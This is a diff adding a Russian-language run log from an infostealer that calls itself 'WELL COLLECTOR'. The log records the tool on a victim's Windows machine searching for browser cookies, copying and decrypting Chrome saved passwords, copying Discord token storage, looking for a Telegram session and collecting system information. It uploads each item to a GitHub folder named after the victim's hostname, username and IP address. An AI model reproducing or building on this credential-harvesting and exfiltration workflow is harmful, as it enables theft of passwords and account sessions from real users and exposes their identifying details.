@@ -1,0 +1,23 @@
+2026-08-16 02:35:51.341114: === WELL COLLECTOR STARTED ===
+2026-08-16 02:35:51.341114: Client ID: DESKTOP-V9T8264_max_26_121_173_127
+2026-08-16 02:35:51.341114: Client Folder: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_023551
+2026-08-16 02:35:51.341114: [*] Сбор кук...
+2026-08-16 02:35:51.341114: [COOKIES] Не найден: C:\Users\max\AppData\Local\Google\Chrome\User Data\Default\Cookies
+2026-08-16 02:35:51.342113: [COOKIES] Не найден: C:\Users\max\AppData\Local\Microsoft\Edge\User Data\Default\Cookies
+2026-08-16 02:35:51.342113: [COOKIES] Не найден: C:\Users\max\AppData\Local\Opera Software\Opera Stable\Cookies
+2026-08-16 02:35:51.342113: [*] Сбор паролей...
+2026-08-16 02:35:51.347114: [PASSWORDS] Скопирован: C:\Users\max\AppData\Local\Google\Chrome\User Data\Default\Login Data
+2026-08-16 02:35:53.383771: [GITHUB] Загружен: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_023551/passwords_User Data.db
+2026-08-16 02:35:53.386772: [PASSWORDS] Расшифровано и сохранено: C:\Users\max\AppData\Local\Temp\well_dump_DESKTOP-V9T8264_max_26_121_173_127\passwords_User Data.txt
+2026-08-16 02:35:55.085404: [GITHUB] Загружен: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_023551/passwords_User Data.txt
+2026-08-16 02:35:55.088406: [*] Сбор Telegram сессии...
+2026-08-16 02:35:55.088406: [TELEGRAM] Не найден: C:\Users\max\AppData\Roaming\Telegram Desktop\tdata
+2026-08-16 02:35:55.088406: [*] Сбор дополнительных данных...
+2026-08-16 02:35:55.106406: [DISCORD] Скопирован: C:\Users\max\AppData\Roaming\discord\Local Storage\leveldb
+2026-08-16 02:36:00.717357: [GITHUB] Загружен: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_023551/discord_discord.zip
+2026-08-16 02:36:00.720358: [*] Сбор системной информации...
+2026-08-16 02:36:00.989878: [SYSTEM] Сохранена информация
+2026-08-16 02:36:02.798020: [GITHUB] Загружен: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_023551/system_info.json
+2026-08-16 02:36:04.738174: [GITHUB] Загружен: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_023551/README.md
+2026-08-16 02:36:04.740176: [*] Генерация отчёта...
+2026-08-16 02:36:06.428308: [GITHUB] Загружен: clients/DESKTOP-V9T8264_max_26_121_173_127_20260816_023551/FINAL_REPORT.txt
